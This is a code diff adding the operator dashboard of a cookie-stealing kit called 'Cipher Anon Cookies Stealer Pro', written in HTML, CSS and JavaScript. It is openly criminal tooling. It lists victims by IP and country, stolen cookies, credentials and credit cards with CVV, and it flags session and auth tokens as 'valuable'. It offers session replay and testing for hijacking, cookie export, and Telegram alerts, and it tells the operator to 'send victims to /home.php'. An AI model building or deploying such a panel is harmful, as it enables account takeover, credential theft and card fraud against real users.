+        .empty-state code { color: #00ff88; background: #0f1626; padding: 2px 8px; border-radius: 4px; border: 1px solid #1a2538; font-size: 11px; }
+
+        .toast {
+            position: fixed;
+            bottom: 16px;
+            right: 16px;
+            background: #0f1626;
+            border: 1px solid #1a2538;
+            padding: 8px 16px;
+            border-radius: 8px;
+            color: #c8d0dc;
+            font-size: 11px;
+            opacity: 0;
+            transform: translateY(16px) scale(0.95);
+            transition: all 0.35s ease;
+            z-index: 2000;
+            max-width: 320px;
+            box-shadow: 0 8px 30px rgba(0,0,0,0.5);
+            font-weight: 500;
+        }
+        .toast.show { opacity: 1; transform: translateY(0) scale(1); }
+        .toast.success { border-color: #00ff88; color: #00ff88; }
+        .toast.error { border-color: #ff4444; color: #ff4444; }
+        .toast.warning { border-color: #f59e0b; color: #f59e0b; }
+
+        .powered-footer { text-align: center; font-size: 10px; color: #1e293b; margin-top: 16px; padding-top: 12px; border-top: 1px solid #1a2538; }
+        .powered-footer .name { color: #00ff88; font-weight: 600; }
+
+        @media (max-width: 992px) { .domain-grid { grid-template-columns: repeat(auto-fill, minmax(260px, 1fr)); } }
+        @media (max-width: 768px) {
+            .sidebar { position: fixed; top: 0; left: 0; transform: translateX(-260px); width: 260px; height: 100vh; z-index: 150; border-right: 1px solid #1a2538; box-shadow: 4px 0 40px rgba(0,0,0,0.5); }
+            .sidebar.open { transform: translateX(0); }
+            .sidebar-overlay.active { display: block; }
+            .sidebar-toggle { display: block; }
+            .main { padding: 14px; padding-top: 54px; }
+            .topbar .page-title h2 { font-size: 17px; }
+            .stats-row { grid-template-columns: repeat(2, 1fr); }
+            .domain-grid { grid-template-columns: 1fr; }
+            .modal { padding: 14px; }
+            .settings-modal { padding: 14px; }
+            .modal .victim-entry .victim-header .time-badge { margin-left: 0; width: 100%; }
+            .settings-modal .btn-group { flex-direction: column; }
+            .logout-confirm-box { padding: 20px 16px; }
+            .custom-confirm-box { padding: 20px 16px; }
+            .victims-grid { grid-template-columns: 1fr; }
+        }
+        @media (max-width: 480px) {
+            .stats-row { grid-template-columns: 1fr; }
+            .toolbar .left, .toolbar .right { width: 100%; justify-content: center; }
+            .topbar .right { flex-wrap: wrap; justify-content: center; }
+            .topbar .right .settings-btn { font-size: 11px; padding: 3px 8px; }
+            .topbar .right .logout-btn { font-size: 11px; padding: 3px 8px; }
+            .topbar .right .user { font-size: 11px; padding: 3px 8px; }
+            .topbar .right .live-badge { font-size: 11px; padding: 3px 8px; }
+            .domain-card .header .domain { font-size: 13px; }
+            .domain-card .stats { font-size: 10px; gap: 8px; }
+            .domain-card .victims-list .victim-tag { font-size: 7px; }
+            .modal .victim-entry .victim-header .ip { font-size: 11px; }
+            .modal .victim-entry .victim-header .flag { font-size: 16px; }
+            .modal .victim-entry .cookies-section .cookie-item { font-size: 8px; flex-wrap: wrap; }
+            .modal .victim-entry .cookies-section .cookie-item .value { max-width: 80px; }
+            .cookies-table { font-size: 9px; min-width: 400px; }
+            .cookies-table td, .cookies-table th { padding: 4px 6px; }
+            .settings-modal { padding: 12px; }
+            .stats-row .stat-card .number { font-size: 20px; }
+            .btn { font-size: 10px; padding: 4px 8px; }
+        }
+        @media (max-width: 360px) {
+            .main { padding: 10px; padding-top: 48px; }
+            .domain-card { padding: 10px 12px; }
+            .domain-card .header .domain { font-size: 12px; }
+            .domain-card .victims-list .victim-tag .ip { font-size: 7px; }
+            .topbar .page-title h2 { font-size: 15px; }
+            .modal .victim-entry .cookies-section .cookie-item .value { max-width: 60px; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- MOBILE SIDEBAR TOGGLE -->
+    <button class="sidebar-toggle" id="sidebarToggle" onclick="toggleSidebar()">☰</button>
+    <div class="sidebar-overlay" id="sidebarOverlay" onclick="toggleSidebar()"></div>
+
+    <!-- SIDEBAR -->
+    <div class="sidebar" id="sidebar">
+        <div class="logo">
+            <div class="brand">
+                <span class="icon">🍪</span>
+                Cipher <span class="highlight">Anon</span>
+            </div>
+            <div class="sub">Cookies <span>Stealer</span> Pro</div>
+        </div>
+
+        <div class="nav-item active" data-view="main" id="navMain">
+            <span class="icon">📊</span> Dashboard
+        </div>
+        <div class="nav-item" data-view="cookies" id="navCookies">
+            <span class="icon">🍪</span> Cookies
+            <span class="badge" id="cookiesCount" style="margin-left:auto;background:#00ff88;color:#0b0f1a;font-size:9px;padding:0 6px;border-radius:8px;font-weight:700;min-width:18px;text-align:center;">0</span>
+        </div>
+        <div class="nav-item" data-view="victims" id="navVictims">
+            <span class="icon">👤</span> Victims
+            <span class="badge" id="victimsCount" style="margin-left:auto;background:#f59e0b;color:#0b0f1a;font-size:9px;padding:0 6px;border-radius:8px;font-weight:700;min-width:18px;text-align:center;">0</span>
+        </div>
+        <div class="nav-item creds-nav" data-view="creds" id="navCreds">
+            <span class="icon">🔐</span> Credentials
+            <span class="badge" id="credsCount">0</span>
+        </div>
+        <div class="nav-item cards-nav" data-view="cards" id="navCards">
+            <span class="icon">💳</span> Cards
+            <span class="badge" id="cardsCount">0</span>
+        </div>
+        <div class="nav-item trash-nav" data-view="trash" id="navTrash">
+            <span class="icon">🗑️</span> Trash
+            <span class="badge" id="trashCount">0</span>
+        </div>
+
+        <div class="nav-divider"></div>
+        <div class="nav-label">Tools</div>
+
+        <div class="nav-item" data-view="replay" id="navReplay">
+            <span class="icon">▶️</span> Session Replay
+        </div>
+        <div class="nav-item" data-view="tester" id="navTester">
+            <span class="icon">🔍</span> Session Tester
+        </div>
+        <div class="nav-item" data-view="export" id="navExport">
+            <span class="icon">📥</span> Export Data
+        </div>
+
+        <div class="nav-divider"></div>
+        <div class="version">
+            <span>●</span> v2.0 · Secure <span>●</span>
+        </div>
+    </div>
+
+    <!-- MAIN CONTENT -->
+    <div class="main" id="mainContent">
+
+        <div class="topbar" id="topbar">
+            <div class="page-title">
+                <h2 id="pageTitle">Dashboard</h2>
+                <p id="pageSub">Monitor stolen cookies &amp; sessions · <span class="accent">Cipher Anon</span> Pro</p>
+            </div>
+            <div class="right">
+                <div class="live-badge">
+                    <span class="dot"></span>
+                    Live
+                </div>
+                <button class="settings-btn" onclick="openSettings()">⚙️</button>
+                <button class="logout-btn" onclick="showLogoutConfirm()">🚪</button>
+                <div class="user">
+                    <div class="avatar">A</div>
+                    Admin
+                </div>
+            </div>
+        </div>
+
+        <!-- VIEW: MAIN DASHBOARD -->
+        <div class="view-content active" id="viewMain">
+            <div class="stats-row" id="statsRow">
+                <div class="stat-card">
+                    <div class="label">Total Victims</div>
+                    <div class="number green" id="statVictims">0</div>
+                    <div class="sub">Unique sessions</div>
+                </div>
+                <div class="stat-card">
+                    <div class="label">Total Cookies</div>
+                    <div class="number orange" id="statCookies">0</div>
+                    <div class="sub">Across all domains</div>
+                </div>
+                <div class="stat-card">
+                    <div class="label">Credentials</div>
+                    <div class="number pink" id="statCredentials">0</div>
+                    <div class="sub">Usernames, emails, passwords</div>
+                </div>
+                <div class="stat-card">
+                    <div class="label">Cards</div>
+                    <div class="number cyan" id="statCards">0</div>
+                    <div class="sub">Card numbers, CVV, expiry</div>
+                </div>
+                <div class="stat-card">
+                    <div class="label">Unique Domains</div>
+                    <div class="number purple" id="statDomains">0</div>
+                    <div class="sub">Websites compromised</div>
+                </div>
+                <div class="stat-card">
+                    <div class="label">Browsers</div>
+                    <div class="number blue" id="statBrowsers">0</div>
+                    <div class="sub">Different browsers</div>
+                </div>
+            </div>
+
+            <div class="toolbar">
+                <div class="left">
+                    <button class="btn primary" onclick="downloadJSON()">📥 JSON</button>
+                    <button class="btn warning" onclick="downloadNetscape()">📥 Netscape</button>
+                </div>
+                <div class="right">
+                    <button class="btn danger" onclick="showClearAllConfirm()">🗑️ Clear</button>
+                    <button class="btn" onclick="fetchData()">🔄 Refresh</button>
+                </div>
+            </div>
+
+            <div class="domain-grid" id="domainGrid">
+                <div class="empty-state">
+                    <div class="icon">🍪</div>
+                    <h3>No cookies stolen yet</h3>
+                    <p>Send victims to <code>/home.php</code></p>
+                </div>
+            </div>
+        </div>
+
+        <!-- VIEW: COOKIES -->
+        <div class="view-content" id="viewCookies">
+            <div class="toolbar" style="margin-bottom:12px;">
+                <div class="left"><span style="color:#64748b;font-size:12px;">All stolen cookies</span></div>
+                <div class="right"><button class="btn" onclick="switchView('main')">← Back</button></div>
+            </div>
+            <div class="cookies-table-wrap" id="cookiesTableWrap">
+                <div class="empty-state"><div class="icon">🍪</div><h3>No cookies stolen</h3></div>
+            </div>
+        </div>
+
+        <!-- VIEW: VICTIMS -->
+        <div class="view-content" id="viewVictims">
+            <div class="toolbar" style="margin-bottom:12px;">
+                <div class="left"><span style="color:#64748b;font-size:12px;">All victims</span></div>
+                <div class="right"><button class="btn" onclick="switchView('main')">← Back</button></div>
+            </div>
+            <div class="victims-grid" id="victimsGrid">
+                <div class="empty-state"><div class="icon">👤</div><h3>No victims yet</h3></div>
+            </div>
+        </div>
+
+        <!-- VIEW: CREDENTIALS -->
+        <div class="view-content" id="viewCreds">
+            <div class="toolbar" style="margin-bottom:12px;">
+                <div class="left"><span style="color:#ec4899;font-size:12px;">🔐 Stolen Credentials</span></div>
+                <div class="right"><button class="btn" onclick="switchView('main')">← Back</button></div>
+            </div>
+            <div id="credsTableWrap">
+                <div class="empty-state"><div class="icon">🔐</div><h3>No credentials stolen</h3></div>
+            </div>
+        </div>
+
+        <!-- VIEW: CARDS -->
+        <div class="view-content" id="viewCards">
+            <div class="toolbar" style="margin-bottom:12px;">
+                <div class="left"><span style="color:#06b6d4;font-size:12px;">💳 Stolen Cards</span></div>
+                <div class="right"><button class="btn" onclick="switchView('main')">← Back</button></div>
+            </div>
+            <div id="cardsTableWrap">
+                <div class="empty-state"><div class="icon">💳</div><h3>No cards stolen</h3></div>
+            </div>
+        </div>
+
+        <!-- VIEW: TRASH -->
+        <div class="view-content" id="viewTrash">
+            <div class="stats-row">
+                <div class="stat-card">
+                    <div class="label">Trash Items</div>
+                    <div class="number orange" id="trashItemCount">0</div>
+                    <div class="sub">Victims in trash</div>
+                </div>
+                <div class="stat-card">
+                    <div class="label">Domains</div>
+                    <div class="number purple" id="trashDomainCount">0</div>
+                    <div class="sub">Unique domains</div>
+                </div>
+            </div>
+            <div class="toolbar">
+                <div class="left">
+                    <button class="btn danger" onclick="showEmptyTrashConfirm()">🗑️ Empty Trash</button>
+                </div>
+                <div class="right">
+                    <button class="btn" onclick="fetchTrash()">🔄 Refresh</button>
+                    <button class="btn" onclick="switchView('main')">← Back</button>
+                </div>
+            </div>
+            <div class="domain-grid" id="trashGrid">
+                <div class="empty-state"><div class="icon">🗑️</div><h3>Trash is empty</h3></div>
+            </div>
+        </div>
+
+        <!-- VIEW: SESSION REPLAY -->
+        <div class="view-content" id="viewReplay">
+            <div class="toolbar" style="margin-bottom:12px;">
+                <div class="left"><span style="color:#64748b;font-size:12px;">Select a domain</span></div>
+                <div class="right"><button class="btn" onclick="switchView('main')">← Back</button></div>
+            </div>
+            <div style="background:#0f1626;border:1px solid #1a2538;border-radius:10px;padding:16px;max-width:450px;">
+                <div style="margin-bottom:10px;">
+                    <label style="color:#94a3b8;font-size:12px;display:block;margin-bottom:3px;">Domain</label>
+                    <select id="replayDomainSelect" style="width:100%;padding:8px 12px;background:#0b0f1a;border:1px solid #1a2538;border-radius:6px;color:#e2e8f0;font-size:13px;outline:none;">
+                        <option value="">— Loading —</option>
+                    </select>
+                </div>
+                <button class="btn primary" onclick="replaySelectedDomain()" style="width:100%;justify-content:center;padding:8px;">
+                    ▶️ Replay
+                </button>
+                <div id="replayStatus" style="margin-top:10px;font-size:11px;color:#64748b;text-align:center;"></div>
+            </div>
+        </div>
+
+        <!-- VIEW: SESSION TESTER -->
+        <div class="view-content" id="viewTester">
+            <div class="toolbar" style="margin-bottom:12px;">
+                <div class="left"><span style="color:#64748b;font-size:12px;">Test all domains</span></div>
+                <div class="right"><button class="btn" onclick="switchView('main')">← Back</button></div>
+            </div>
+            <div style="background:#0f1626;border:1px solid #1a2538;border-radius:10px;padding:16px;">
+                <button class="btn primary" onclick="testAllDomains()" style="width:100%;justify-content:center;padding:8px;margin-bottom:12px;">
+                    🔍 Test All
+                </button>
+                <div id="testerResults" style="display:flex;flex-direction:column;gap:6px;">
+                    <div style="color:#64748b;font-size:12px;text-align:center;">Click to test</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- VIEW: EXPORT DATA -->
+        <div class="view-content" id="viewExport">
+            <div class="toolbar" style="margin-bottom:12px;">
+                <div class="left"><span style="color:#64748b;font-size:12px;">Export formats</span></div>
+                <div class="right"><button class="btn" onclick="switchView('main')">← Back</button></div>
+            </div>
+            <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(160px,1fr));gap:10px;">
+                <div style="background:#0f1626;border:1px solid #1a2538;border-radius:10px;padding:14px;text-align:center;">
+                    <div style="font-size:28px;margin-bottom:4px;">📄</div>
+                    <div style="font-weight:600;color:#f1f5f9;font-size:13px;">JSON</div>
+                    <button class="btn primary" onclick="downloadJSON()" style="width:100%;justify-content:center;margin-top:6px;font-size:10px;">Download</button>
+                </div>
+                <div style="background:#0f1626;border:1px solid #1a2538;border-radius:10px;padding:14px;text-align:center;">
+                    <div style="font-size:28px;margin-bottom:4px;">📋</div>
+                    <div style="font-weight:600;color:#f1f5f9;font-size:13px;">Netscape</div>
+                    <button class="btn warning" onclick="downloadNetscape()" style="width:100%;justify-content:center;margin-top:6px;font-size:10px;">Download</button>
+                </div>
+                <div style="background:#0f1626;border:1px solid #1a2538;border-radius:10px;padding:14px;text-align:center;">
+                    <div style="font-size:28px;margin-bottom:4px;">📊</div>
+                    <div style="font-weight:600;color:#f1f5f9;font-size:13px;">CSV</div>
+                    <button class="btn" onclick="exportCSV()" style="width:100%;justify-content:center;margin-top:6px;font-size:10px;border-color:#8b5cf6;color:#8b5cf6;">Download</button>
+                </div>
+                <div style="background:#0f1626;border:1px solid #1a2538;border-radius:10px;padding:14px;text-align:center;">
+                    <div style="font-size:28px;margin-bottom:4px;">📑</div>
+                    <div style="font-weight:600;color:#f1f5f9;font-size:13px;">Raw JSON</div>
+                    <button class="btn" onclick="exportRawJSON()" style="width:100%;justify-content:center;margin-top:6px;font-size:10px;border-color:#f59e0b;color:#f59e0b;">Download</button>
+                </div>
+            </div>
+        </div>
+
+        <div class="powered-footer">
+            Powered By <span class="name">CipherAnon</span>
+        </div>
+    </div>
+
+    <!-- MODALS -->
+    <div class="modal-overlay" id="modalOverlay">
+        <div class="modal">
+            <button class="close" onclick="closeModal()">✕</button>
+            <h2 id="modalTitle">Domain</h2>
+            <div id="modalContent"></div>
+            <div class="session-actions">
+                <button class="btn primary" onclick="replayFromModal()">▶️ Replay</button>
+                <button class="btn" style="border-color:#3b82f6;color:#3b82f6;" onclick="testFromModal()">🔍 Test</button>
+            </div>
+            <div class="test-result" id="testResultModal"></div>
+        </div>
+    </div>
+
+    <div class="settings-modal-overlay" id="settingsOverlay">
+        <div class="settings-modal">
+            <button class="close" onclick="closeSettings()">✕</button>
+            <h2>⚙️ Settings</h2>
+            <div style="border-bottom:1px solid #1a2538;padding-bottom:12px;margin-bottom:12px;">
+                <div class="section-title">🔒 Change Password</div>
+                <div class="form-group">
+                    <label>Current Password</label>
+                    <input type="password" id="oldPassword" placeholder="Current password" />
+                    <div class="error-text" id="oldPasswordError">Incorrect</div>
+                </div>
+                <div class="form-group">
+                    <label>New Password</label>
+                    <input type="password" id="newPassword" placeholder="Min 4 chars" />
+                    <div class="error-text" id="newPasswordError">Min 4 chars</div>
+                </div>
+                <div class="form-group">
+                    <label>Confirm</label>
+                    <input type="password" id="confirmPassword" placeholder="Confirm" />
+                    <div class="error-text" id="confirmPasswordError">No match</div>
+                </div>
+                <button class="btn primary" onclick="changePassword()" style="width:100%;justify-content:center;">Change</button>
+            </div>
+            <div>
+                <div class="section-title">🤖 Telegram Settings</div>
+                <div class="form-group">
+                    <label>Bot Token</label>
+                    <input type="text" id="telegramToken" placeholder="Token from @BotFather" />
+                    <div class="help-text"><a href="https://t.me/BotFather" target="_blank">@BotFather</a></div>
+                </div>
+                <div class="form-group">
+                    <label>Chat ID</label>
+                    <input type="text" id="telegramChatId" placeholder="Chat ID" />
+                    <div class="help-text"><a href="https://t.me/userinfobot" target="_blank">@userinfobot</a></div>
+                </div>
+                <div class="form-group">
+                    <label class="checkbox-label">
+                        <input type="checkbox" id="telegramNotifications" checked />
+                        Send notifications
+                    </label>
+                </div>
+                <button class="btn primary" onclick="updateTelegramSettings()" style="width:100%;justify-content:center;">Save</button>
+            </div>
+            <div class="info-text">
+                Username: <span class="key">admin</span> · Settings saved to config.json
+            </div>
+        </div>
+    </div>
+
+    <div class="logout-confirm-overlay" id="logoutConfirmOverlay">
+        <div class="logout-confirm-box">
+            <div class="icon">🚪</div>
+            <h3>Confirm Logout</h3>
+            <p>You will need to login again.</p>
+            <div class="btn-group">
+                <button class="btn cancel" onclick="hideLogoutConfirm()">Cancel</button>
+                <button class="btn confirm" onclick="executeLogout()">Logout</button>
+            </div>
+        </div>
+    </div>
+
+    <div class="custom-confirm-overlay" id="customConfirmOverlay">
+        <div class="custom-confirm-box">
+            <div class="icon" id="confirmIcon">⚠️</div>
+            <h3 id="confirmTitle">Confirm</h3>
+            <p id="confirmMessage">Are you sure?</p>
+            <div class="btn-group">
+                <button class="btn cancel" onclick="hideCustomConfirm()">Cancel</button>
+                <button class="btn confirm" id="confirmActionBtn" onclick="executeConfirmAction()">Confirm</button>
+            </div>
+        </div>
+    </div>
+
+    <div class="toast" id="toast"></div>
+
+    <!-- ============================================================
+    DASHBOARD LOGIC — COMPLETE WITH CREDS/CARDS VIEWS + COUNTS
+    ============================================================ -->
+    <script>
+        // ============================================================
+        // SESSION CHECK
+        // ============================================================
+
+        async function checkSession() {
+            try {
+                const res = await fetch('/api/data');
+                if (res.status === 401) {
+                    window.location.href = '/login.php';
+                    return false;
+                }
+                return true;
+            } catch (e) {
+                window.location.href = '/login.php';
+                return false;
+            }
+        }
+
+        // ============================================================
+        // STATE
+        // ============================================================
+
+        let allData = [];
+        let trashData = [];
+        let currentModalDomain = null;
+        let currentModalStats = null;
+        let currentView = 'main';
+        let isTestingAll = false;
+        let confirmCallback = null;
+
+        const VALUABLE_PATTERNS = ['session','token','auth','login','sid','uid','PHPSESSID','jwt','access_token','refresh_token','api_key','secret','csrf','__Secure','__Host','laravel_session','remember','wordpress_logged_in','wp_session','drupal_session'];
+
+        function isValuable(n) {
+            const l = n.toLowerCase();
+            return VALUABLE_PATTERNS.some(p => l.includes(p.toLowerCase()));
+        }
+
+        function getFlagEmoji(code) {
+            if (!code || code === 'XX') return '🌍';
+            try {
+                const cp = code.toUpperCase().split('').map(c => 127397 + c.charCodeAt(0));
+                return String.fromCodePoint(...cp);
+            } catch { return '🌍'; }
+        }
+
+        function timeAgo(dateString) {
+            if (!dateString) return 'Unknown';
+            try {
+                const now = new Date();
+                const past = new Date(dateString);
+                if (isNaN(past.getTime())) return 'Invalid date';
+                const diffMs = now - past;
+                if (diffMs < 0) return 'Future date';
+                const diffSec = Math.floor(diffMs / 1000);
+                const diffMin = Math.floor(diffSec / 60);
+                const diffHour = Math.floor(diffMin / 60);
+                const diffDay = Math.floor(diffHour / 24);
+
+                if (diffSec < 10) return 'Just now';
+                if (diffSec < 60) return `${diffSec}s ago`;
+                if (diffMin < 60) return `${diffMin}m ago`;
+                if (diffHour < 24) return `${diffHour}h ago`;
+                if (diffDay < 7) return `${diffDay}d ago`;
+                return past.toLocaleDateString();
+            } catch {
+                return 'Invalid date';
+            }
+        }
+
+        function formatFullTime(dateString) {
+            if (!dateString) return 'Unknown';
+            try {
+                const d = new Date(dateString);
+                if (isNaN(d.getTime())) return 'Invalid date';
+                return d.toLocaleDateString() + ' ' + d.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' });
+            } catch {
+                return 'Invalid date';
+            }
+        }
+
+        function showToast(msg, type) {
+            const el = document.getElementById('toast');
+            el.textContent = msg;
+            el.className = 'toast show ' + (type || '');
+            clearTimeout(el._timer);
+            el._timer = setTimeout(() => { el.className = 'toast'; }, 3000);
+        }
+
+        // ============================================================
+        // CUSTOM CONFIRM
+        // ============================================================
+
+        function showCustomConfirm(title, message, icon, callback, danger = false) {
+            document.getElementById('confirmTitle').textContent = title;
+            document.getElementById('confirmMessage').textContent = message;
+            document.getElementById('confirmIcon').textContent = icon || '⚠️';
+            const btn = document.getElementById('confirmActionBtn');
+            btn.className = danger ? 'btn danger-confirm' : 'btn confirm';
+            btn.textContent = danger ? '🗑️ Confirm' : 'Confirm';
+            confirmCallback = callback;
+            document.getElementById('customConfirmOverlay').classList.add('active');
+        }
+
+        function hideCustomConfirm() {
+            document.getElementById('customConfirmOverlay').classList.remove('active');
+            confirmCallback = null;
+        }
+
+        function executeConfirmAction() {
+            if (confirmCallback) {
+                const cb = confirmCallback;
+                confirmCallback = null;
+                hideCustomConfirm();
+                cb();
+            } else {
+                hideCustomConfirm();
+            }
+        }
+
+        // ============================================================
+        // SIDEBAR
+        // ============================================================
+
+        function toggleSidebar() {
+            document.getElementById('sidebar').classList.toggle('open');
+            document.getElementById('sidebarOverlay').classList.toggle('active');
+        }
+
+        function closeSidebar() {
+            document.getElementById('sidebar').classList.remove('open');
+            document.getElementById('sidebarOverlay').classList.remove('active');
+        }
+
+        // ============================================================
+        // VIEW SWITCHING
+        // ============================================================
+
+        function switchView(view) {
+            currentView = view;
+            document.querySelectorAll('.view-content').forEach(el => el.classList.remove('active'));
+            document.querySelectorAll('.sidebar .nav-item').forEach(el => el.classList.remove('active'));
+
+            const viewMap = {
+                'main': { viewId: 'viewMain', navId: 'navMain', title: 'Dashboard', sub: 'Monitor stolen cookies & sessions · ' },
+                'cookies': { viewId: 'viewCookies', navId: 'navCookies', title: '🍪 All Cookies', sub: 'View all stolen cookies' },
+                'victims': { viewId: 'viewVictims', navId: 'navVictims', title: '👤 All Victims', sub: 'All victims' },
+                'creds': { viewId: 'viewCreds', navId: 'navCreds', title: '🔐 Credentials', sub: 'All stolen credentials' },
+                'cards': { viewId: 'viewCards', navId: 'navCards', title: '💳 Cards', sub: 'All stolen credit cards' },
+                'trash': { viewId: 'viewTrash', navId: 'navTrash', title: '🗑️ Trash', sub: 'Deleted victims' },
+                'replay': { viewId: 'viewReplay', navId: 'navReplay', title: '▶️ Session Replay', sub: 'Replay a session' },
+                'tester': { viewId: 'viewTester', navId: 'navTester', title: '🔍 Session Tester', sub: 'Test all domains' },
+                'export': { viewId: 'viewExport', navId: 'navExport', title: '📥 Export Data', sub: 'Export formats' }
+            };
+
+            const info = viewMap[view];
+            if (info) {
+                document.getElementById(info.viewId).classList.add('active');
+                document.getElementById(info.navId).classList.add('active');
+                document.getElementById('pageTitle').textContent = info.title;
+                document.getElementById('pageSub').innerHTML = info.sub + ' · <span class="accent">Cipher Anon</span>';
+            }
+
+            closeSidebar();
+            if (view === 'cookies') renderCookiesView();
+            if (view === 'victims') renderVictimsView();
+            if (view === 'creds') renderCredsView();
+            if (view === 'cards') renderCardsView();
+            if (view === 'replay') populateReplayDomains();
+            if (view === 'main') fetchData();
+            if (view === 'trash') fetchTrash();
+        }
+
+        // ============================================================
+        // FETCH DATA
+        // ============================================================
+
+        async function fetchData() {
+            try {
+                const res = await fetch('/api/data');
+                if (res.status === 401) { window.location.href = '/login.php'; return; }
+                allData = await res.json();
+                render(allData);
+                updateSidebarCounts(allData);
+            } catch(e) {
+                if (e.message && e.message.includes('401')) window.location.href = '/login.php';
+                else showToast('⚠️ Failed to fetch data', 'error');
+            }
+        }
+
+        async function fetchTrash() {
+            try {
+                const res = await fetch('/api/trash');
+                if (res.status === 401) { window.location.href = '/login.php'; return; }
+                trashData = await res.json();
+                renderTrash(trashData);
+                document.getElementById('trashCount').textContent = trashData.length;
+                document.getElementById('trashItemCount').textContent = trashData.length;
+                document.getElementById('trashDomainCount').textContent = new Set(trashData.map(e => e.fingerprint?.hostname || e.domain || 'unknown')).size;
+            } catch(e) {
+                if (e.message && e.message.includes('401')) window.location.href = '/login.php';
+                else showToast('⚠️ Failed to fetch trash', 'error');
+            }
+        }
+
+        // ============================================================
+        // UPDATE SIDEBAR COUNTS
+        // ============================================================
+
+        function updateSidebarCounts(data) {
+            let totalCookies = 0;
+            let totalCreds = 0;
+            let totalCards = 0;
+            const victims = data.length;
+
+            data.forEach(entry => {
+                totalCookies += Object.keys(entry.cookies || {}).length;
+                totalCreds += (entry.credentials || []).length;
+                totalCards += (entry.cards || []).length;
+            });
+
+            document.getElementById('cookiesCount').textContent = totalCookies;
+            document.getElementById('victimsCount').textContent = victims;
+            document.getElementById('credsCount').textContent = totalCreds;
+            document.getElementById('cardsCount').textContent = totalCards;
+        }
+
+        // ============================================================
+        // RENDER FUNCTIONS
+        // ============================================================
+
+        function render(data) {
+            const domains = new Set();
+            let totalCookies = 0;
+            let totalCreds = 0;
+            let totalCards = 0;
+            const domainStats = {};
+            const browsers = new Set();
+
+            data.forEach(entry => {
+                const domain = entry.fingerprint?.hostname || entry.domain || 'unknown';
+                domains.add(domain);
+                const cookieCount = Object.keys(entry.cookies || {}).length;
+                totalCookies += cookieCount;
+                const creds = entry.credentials || [];
+                const cards = entry.cards || [];
+                totalCreds += creds.length;
+                totalCards += cards.length;
+
+                const ua = entry.fingerprint?.userAgent || '';
+                let browser = 'Unknown';
+                if (ua.includes('Chrome') && !ua.includes('Edg')) browser = 'Chrome';
+                else if (ua.includes('Edg')) browser = 'Edge';
+                else if (ua.includes('Firefox')) browser = 'Firefox';
+                else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
+                else if (ua.includes('Opera')) browser = 'Opera';
+                else if (ua.includes('Brave')) browser = 'Brave';
+                browsers.add(browser);
+
+                if (!domainStats[domain]) {
+                    domainStats[domain] = { cookies: 0, victims: 0, entries: [], browsers: new Set(), creds: 0, cards: 0 };
+                }
+                domainStats[domain].cookies += cookieCount;
+                domainStats[domain].victims += 1;
+                domainStats[domain].creds += creds.length;
+                domainStats[domain].cards += cards.length;
+                domainStats[domain].entries.push(entry);
+                domainStats[domain].browsers.add(browser);
+            });
+
+            document.getElementById('statVictims').textContent = data.length;
+            document.getElementById('statCookies').textContent = totalCookies;
+            document.getElementById('statCredentials').textContent = totalCreds;
+            document.getElementById('statCards').textContent = totalCards;
+            document.getElementById('statDomains').textContent = domains.size;
+            document.getElementById('statBrowsers').textContent = browsers.size;
+
+            const sorted = Object.entries(domainStats).sort((a, b) => b[1].cookies - a[1].cookies);
+            const grid = document.getElementById('domainGrid');
+            grid.innerHTML = '';
+
+            if (sorted.length === 0) {
+                grid.innerHTML = `<div class="empty-state"><div class="icon">🍪</div><h3>No cookies stolen yet</h3><p>Send victims to <code>/home.php</code></p></div>`;
+                return;
+            }
+
+            sorted.forEach(([domain, stats]) => {
+                let hasValuable = false;
+                stats.entries.forEach(entry => {
+                    Object.keys(entry.cookies || {}).forEach(name => {
+                        if (isValuable(name)) hasValuable = true;
+                    });
+                });
+
+                const card = document.createElement('div');
+                card.className = 'domain-card';
+
+                let victimsHtml = '';
+                const uniqueVictims = stats.entries.slice(0, 5);
+                uniqueVictims.forEach(entry => {
+                    const flag = getFlagEmoji(entry.countryCode);
+                    const time = timeAgo(entry.receivedAt);
+                    victimsHtml += `
+                        <span class="victim-tag" title="${entry.ip} · ${entry.country} · ${formatFullTime(entry.receivedAt)}">
+                            <span class="flag">${flag}</span>
+                            <span class="ip">${entry.ip}</span>
+                            <span class="time"><span class="ago">${time}</span></span>
+                        </span>
+                    `;
+                });
+                if (stats.entries.length > 5) {
+                    victimsHtml += `<span class="victim-tag" style="background:transparent;border-color:transparent;color:#475569;">+${stats.entries.length - 5}</span>`;
+                }
+
+                let badges = '';
+                if (hasValuable) badges += `<span class="badge-valuable">🔑 Session</span>`;
+                if (stats.creds > 0) badges += `<span class="badge-cred">🔐 ${stats.creds}</span>`;
+                if (stats.cards > 0) badges += `<span class="badge-card">💳 ${stats.cards}</span>`;
+
+                const latestTime = stats.entries[stats.entries.length - 1]?.receivedAt || null;
+                const latestTimeFormatted = latestTime ? timeAgo(latestTime) : 'never';
+
+                card.innerHTML = `
+                    <div class="header">
+                        <span class="domain">${domain}</span>
+                        <div style="display:flex;gap:4px;flex-wrap:wrap;">${badges}</div>
+                    </div>
+                    <div class="stats">
+                        <span class="cookies">🍪 <strong>${stats.cookies}</strong></span>
+                        <span class="victims">👤 <strong>${stats.victims}</strong></span>
+                        ${stats.creds > 0 ? `<span class="creds">🔐 <strong>${stats.creds}</strong></span>` : ''}
+                        ${stats.cards > 0 ? `<span class="cards">💳 <strong>${stats.cards}</strong></span>` : ''}
+                        <span>${Array.from(stats.browsers).slice(0,2).join(', ') || 'Unknown'}</span>
+                    </div>
+                    <div class="victims-list">${victimsHtml}</div>
+                    <div class="meta">
+                        <span class="latest-time">🕐 <span class="time-text">${latestTimeFormatted}</span></span>
+                        <span>${stats.entries.length} total</span>
+                    </div>
+                    <div class="actions">
+                        <button class="btn-sm replay" onclick="event.stopPropagation(); replaySession('${domain}')">▶️</button>
+                        <button class="btn-sm test" onclick="event.stopPropagation(); testSession('${domain}')">🔍</button>
+                        <button class="btn-sm download" onclick="event.stopPropagation(); downloadDomain('${domain}')">📥</button>
+                    </div>
+                `;
+                card.onclick = () => openModal(domain, stats, 'main');
+                grid.appendChild(card);
+            });
+        }
+
+        function renderTrash(data) {
+            const domains = new Set();
+            const domainStats = {};
+
+            data.forEach(entry => {
+                const domain = entry.fingerprint?.hostname || entry.domain || 'unknown';
+                domains.add(domain);
+
+                if (!domainStats[domain]) {
+                    domainStats[domain] = { entries: [] };
+                }
+                domainStats[domain].entries.push(entry);
+            });
+
